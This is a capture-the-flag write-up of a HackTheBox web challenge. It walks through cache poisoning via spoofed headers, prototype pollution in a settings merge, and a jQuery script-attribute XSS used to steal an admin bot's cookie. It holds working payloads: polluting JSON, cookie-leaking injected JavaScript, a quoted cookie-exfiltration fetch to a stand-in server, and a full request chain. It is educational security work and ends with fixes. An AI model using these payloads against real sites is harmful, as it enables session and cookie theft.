# HTB Regregious — Cache Poisoning to XSS

> **Challenge:** HackTheBox — *Regregious* (Web, Medium, 1000 pts)  
> **Flag:** `HTB{p0is0n_4nd_p0llu7i0n_i5_7his_a_s0rc3ry?}`  
> **Given:** the full source code and a live instance  
> **Class:** Web Cache Poisoning → Prototype Pollution → Cross-Site Scripting (XSS)  
> **Audience:** written to be followed even if this is your first real web chain

---

## The idea in plain terms

There is a bot — an automated Chrome browser — that logs into the target site and holds the flag in one of its cookies. My job is to run JavaScript *inside that bot's browser*, read the cookie, and get it back out to me.

Three separate weaknesses stand between me and that goal, and none of them is enough on its own:

1. A **shared cache** lets me leave a booby-trapped response where the bot will pick it up.
2. A **sloppy settings-merge** in the page's JavaScript lets that response quietly rewrite defaults deep inside the JavaScript engine.
3. A **quirk of the jQuery library** turns those rewritten defaults into an actual `<script>` tag that runs my code.

Then a fourth trick reuses weakness #1 *backwards* to carry the stolen cookie home. Let's build it one piece at a time.

> **New to this?** A few terms up front.
> **Cookie** — a small string the browser stores for a site and sends on every request; it's how a site remembers you're logged in.
> **XSS (Cross-Site Scripting)** — getting your own JavaScript to run inside someone else's page/session. If you can do that in the bot's browser, you can do anything the bot can, including read its cookies.
> **`httpOnly`** — a flag that hides a cookie from JavaScript. If it's set, `document.cookie` can't see it. Here it is *not* set, which is why reading the flag with JavaScript is even possible.

## 1. Where the flag lives, and the wall in front of it

The bot's script (`bot.js`) shows exactly what it does:

```js
// bot.js
const cookies = [{ 'name': 'flag', 'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}' }];

await page.goto('http://127.0.0.1:1337/');
await page.setCookie(...cookies);
await page.goto('http://127.0.0.1:1337/', { waitUntil: 'networkidle2' });
await page.evaluate(() => document.querySelector('#buildStubBtn').click());
await page.waitForTimeout(3000);
```

Reading it plainly: the bot sets a `flag` cookie, loads the site's home page, and **clicks a button** (`#buildStubBtn`). The cookie has no `httpOnly`, so if I can run JavaScript in that page, `document.cookie` will hand me the flag. So this is an XSS challenge. I also learn the bot is kicked off by a request to `GET /api/stub/build` coming from any IP that isn't localhost.

Here is the wall. The bot is *logged in as itself*. Everything it sees on the page is the bot's own data. Anything I save while poking the site is saved under *my* account, in *my* session — the bot never sees it. Normal application flow gives me no way to put anything in front of the bot. Breaking through that wall is the entire challenge, and it needs the first bug.

## 2. Bug 1 — poisoning a shared cache

> **What is a cache?** To avoid recomputing the same response over and over, servers often save a response and reuse it. Each saved response is filed under a **cache key** — a label built from parts of the request (often the URL). Next time a request comes in with a matching key, the server skips the work and returns the saved copy. The security rule is simple: **the key must uniquely identify who the response belongs to.** If two different users can produce the same key but deserve different responses, one user can be served the other's data — or plant data for them. That's *cache poisoning.*

Here's the caching code (`routes/index.js`):

```js
cacheKey = `_${req.headers.host}_${req.url}_${(req.headers['x-forwarded-for'] || req.ip)}`;
if (cache.has(cacheKey)) return res.send(JSON.parse(cache.get(cacheKey)));
return db.getUser(req.data.username).then(user => {
    cache.set(cacheKey, user.settings);      // saved for 60 seconds
    res.send(JSON.parse(user.settings));
});
```

Look at what the key is made of: `Host`, the URL, and `X-Forwarded-For`.

> **`Host` and `X-Forwarded-For` are just request headers** — text the client sends and can set to anything. `Host` says which site you're asking for; `X-Forwarded-For` (XFF) is supposed to record the original client IP when a request passes through a proxy. Neither is trustworthy, because the person sending the request writes them.

So the key is built entirely from values I control, and — critically — it **does not include the username or session**. But the *body* it stores (`user.settings`) is per-user. That is the bug: the cache treats "same key" as "same response", while the response actually depends on who's logged in.

Now, what key does the bot produce? The bot always talks to `Host: 127.0.0.1:1337` and sends no `X-Forwarded-For`, so the server falls back to `req.ip`, which is `127.0.0.1` (the app listens on all interfaces and doesn't trust proxy headers). Its key is therefore fixed and knowable in advance:

```
_127.0.0.1:1337_/api/settings_127.0.0.1
```

If **I** send `GET /api/settings` while spoofing `Host: 127.0.0.1:1337` and `X-Forwarded-For: 127.0.0.1`, I generate that *exact* key — and the server saves **my** settings under **the bot's** slot. When the bot later loads the page and its code fetches `/api/settings`, it gets a cache hit and reads *my* JSON instead of its own.

And my settings are whatever I want: they're stored with `JSON.stringify(req.body)` and never validated. I now have a way to hand the bot arbitrary JSON. The wall is down. Next I need that JSON to *do* something.

## 3. Bug 2 — prototype pollution in the settings merge

> **The 30-second version of prototype pollution.** In JavaScript, almost every object shares one common parent object called `Object.prototype`. When you read `obj.foo` and `obj` doesn't have `foo`, JavaScript looks up the parent chain and checks `Object.prototype.foo`. So if an attacker can *write* to `Object.prototype`, they set a default that leaks into **every** object that doesn't override it. The magic word is `__proto__`: for most objects, `obj.__proto__` *is* `Object.prototype`. So writing to `something.__proto__.x` writes a global default `x`. Getting untrusted data into a `.__proto__` path is "prototype pollution."

The page merges the fetched settings into its form state (`static/js/main.js`):

```js
const mergeSettings = (target, source) => {
	for (let key in source) {
		if ((typeof target[key] === 'object') && (typeof source[key] === 'object')) {
			mergeSettings(target[key], source[key]);
		} else {
			target[key] = source[key];
		}
	}
	return target;
};
...
$.get('/api/settings', (savedSettings) => {
	userSettings = mergeSettings(getSettings($('#builder-form')), savedSettings);
```

This is a **recursive merge**: for each key in `source`, if both sides are objects it dives deeper; otherwise it copies the value across. There is no check that rejects the dangerous keys `__proto__`, `constructor`, or `prototype`. And `source` is the JSON I now control (from bug 1).

Two details make this fire:

- **`for...in` sees `__proto__`.** Normally `__proto__` is a hidden accessor, but when a key comes from **`JSON.parse`**, JavaScript creates it as a plain, *enumerable, own* property — so the `for (let key in source)` loop actually visits it.
- **The recursion targets the prototype.** When `key` is `"__proto__"`, both `target["__proto__"]` and `source["__proto__"]` are objects, so the merge recurses with `target` now pointing at `Object.prototype`. Every key inside my nested object gets written onto `Object.prototype` — i.e. becomes a global default on nearly every object in the page.

So by controlling the JSON, I can set arbitrary global defaults inside the bot's page. That's powerful, but it isn't code execution yet. I need a place where one of those planted defaults gets used as something dangerous. That place is jQuery.

## 4. Bug 3 — turning a polluted default into a running script

The button the bot clicks runs this:

```js
$.ajax({ url: '/api/stub/build', type: 'get', success: ..., error: ... });
```

> **`$.ajax` is jQuery's function for making HTTP requests.** You pass it a settings object (URL, method, and options like `dataType` — the kind of response you expect). Anything you *don't* specify falls back to a default. And here's the connection: because of bug 2, "falls back to a default" now means "falls back to a value I planted on `Object.prototype`." This call sets no `dataType` and no `scriptAttrs`, so both are inherited straight from my pollution.

Why does that matter? Because one of jQuery's built-in ways to handle a response is the **script transport** — it takes the response and loads it as a `<script>`. jQuery decides to use it when `dataType` is `"script"`, and the transport looks like this (from `jquery-3.6.0.min.js`):

```js
ajaxTransport("script", function(n) {
  if (n.crossDomain || n.scriptAttrs)
    return { send: function(e, t) {
      r = S("<script>").attr(n.scriptAttrs || {})
                       .prop({ charset: n.scriptCharset, src: n.url })
      ...
```

Read what it does: it creates a `<script>` element and calls `.attr(n.scriptAttrs)` — which sets each key of `scriptAttrs` as an **HTML attribute** on that script tag. HTML attributes include event handlers like `onload` and `onerror`, and an event handler attribute is **executable JavaScript**. So if I pollute `scriptAttrs` with an `onload`, jQuery builds:

```html
<script src="/api/stub/build" onload="MY_JAVASCRIPT_HERE"></script>
```

and the browser runs my JavaScript when that tag loads. Two subtleties I relied on:

- The `if` only needs `crossDomain` **or** `scriptAttrs` to be truthy — so a planted `scriptAttrs` alone is enough to enter the branch.
- I don't control the *body* of `/api/stub/build` (it's fixed JSON), but I don't need to — **the payload lives in the attribute, not the response body.** I set both `onload` and `onerror` so it fires no matter how the browser treats that JSON response.

The settings JSON I poison the bot's cache with is therefore:

```json
{"__proto__": {
   "dataType": "script",
   "crossDomain": true,
   "scriptAttrs": {"onload": "<payload>", "onerror": "<payload>"}
}}
```

> **Why keep it to just three keys?** Everything I add to `Object.prototype` becomes a visible default on *every* object, and lots of library code loops over object keys. Pollute too much and you break the page before the button is ever clicked. Minimal pollution = the page still works, and only my intended sink notices.

## 5. Getting the cookie back — without an attacker server

The textbook exfiltration is `fetch('//my-server/?c=' + document.cookie)`. That needs the bot's container to have outbound internet and needs me to run a server to catch it. In this challenge the box has no outbound network. So instead I run the cache bug **backwards** as my delivery channel.

My injected JavaScript, running inside the bot, does two things:

```js
fetch('/api/settings', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({leak: document.cookie})            // step A: write the flag into the BOT's own row
}).then(() => fetch('/api/settings', {
  headers: {'X-Forwarded-For': 'pwnkey1337'}               // step B: cache it under a label I chose
}));
```

- **Step A** saves the flag into the bot's own settings row on the server.
- **Step B** requests `/api/settings` again with a brand-new `X-Forwarded-For` value. That's a *new* cache key, so it misses the cache; the server reads the bot's row (now holding the flag) and saves it under `_127.0.0.1:1337_/api/settings_pwnkey1337`.

Now I simply request that exact key from my own machine, and the cache hands me the bot's data — flag included.

> **Why is the browser allowed to send these requests?** They go to the *same site* the bot is already on (same-origin), so there's no CORS permission needed and no preflight. `X-Forwarded-For` isn't on the browser's list of banned ("forbidden") headers, so JavaScript is allowed to set it. And cookies ride along automatically, which the site's auth check requires. **The general lesson:** any cache whose key you control but whose body belongs to the victim can be used *both* to plant data and to smuggle data out.

## 6. The whole chain in order

```
1. GET  /                      -> get a normal session cookie for myself
2. POST /api/settings          -> save the __proto__ payload as my settings
3. GET  /api/settings          Host: 127.0.0.1:1337   XFF: 127.0.0.1
                               -> my payload is now sitting in the bot's cache slot
4. GET  /api/stub/build        -> from a non-localhost IP, so the bot launches
5. the bot loads /, its code fetches /api/settings and hits my poisoned cache
   -> the sloppy merge pollutes Object.prototype with my scriptAttrs
   -> the bot clicks #buildStubBtn -> $.ajax picks the script transport
   -> <script src=/api/stub/build onload="..."> runs my JavaScript
   -> the flag is POSTed into the bot's row, then cached under my chosen key
6. GET  /api/settings          Host: 127.0.0.1:1337   XFF: pwnkey1337
                               -> the flag comes back to me
```

The exploit is written with Python's `http.client` (standard library) so I can set the `Host` header independently of the machine I actually connect to. It landed on the first attempt — the cache's 60-second lifetime leaves plenty of margin for a bot that finishes in about four seconds. Full script in [`solve.py`](./solve.py).

## 7. Dead ends worth knowing about

- `$(\`[name=${key}]\`)` in the settings-restore code *looks* like it might let me inject HTML through a selector, but jQuery only treats a string as HTML when it **starts with `<`**. This string always starts with `[`, so it's harmless.
- I can't make the pollution fire on the `/api/settings` response itself (e.g. by asking for it as a script), because the pollution *comes from* that response — it isn't in effect yet when that response arrives. The gadget has to land on the *later* `/api/stub/build` request, which is exactly why the payload must live in an attribute rather than a response body.
- The bot loads the page twice, but prototype pollution doesn't survive a page navigation. Only the second load — the one where the flag cookie is set — matters.

## 8. How the developers should have fixed it

- **Cache key:** include the identity the response belongs to (session or username), and never build a key out of `Host` or `X-Forwarded-For` unless a trusted proxy has already sanitized them.
- **Merge:** reject the keys `__proto__`, `constructor`, and `prototype`; or use a safe technique like `Object.create(null)`, `structuredClone`, or a vetted deep-merge library.
- **Settings:** validate incoming settings against a schema instead of storing the raw request body.
- **Defense in depth:** a Content Security Policy without `unsafe-inline` would have blocked the inline `onload` handler, and marking the flag cookie `httpOnly` would have neutralized the whole cookie-theft class.

One habit that made this smooth: the entire chain was confirmed by reading the shipped source *before* sending any requests — every link, right down to grepping `jquery-3.6.0.min.js` for `scriptAttrs` to be sure the script transport behaved as I expected. Understand the target first, and the exploit tends to work on the first try.

## Further reading

If any concept above was new, these are solid starting points:

- [Web cache poisoning — PortSwigger Web Security Academy](https://portswigger.net/web-security/web-cache-poisoning)
- [Prototype pollution — PortSwigger Web Security Academy](https://portswigger.net/web-security/prototype-pollution)
- [`Object.prototype` and the prototype chain — MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object)
- [Cross-site scripting (XSS) — PortSwigger](https://portswigger.net/web-security/cross-site-scripting)
- [Forbidden header names (what JS can't set) — MDN](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)
- [Content Security Policy (CSP) — MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [jQuery `$.ajax()` settings reference](https://api.jquery.com/jquery.ajax/)
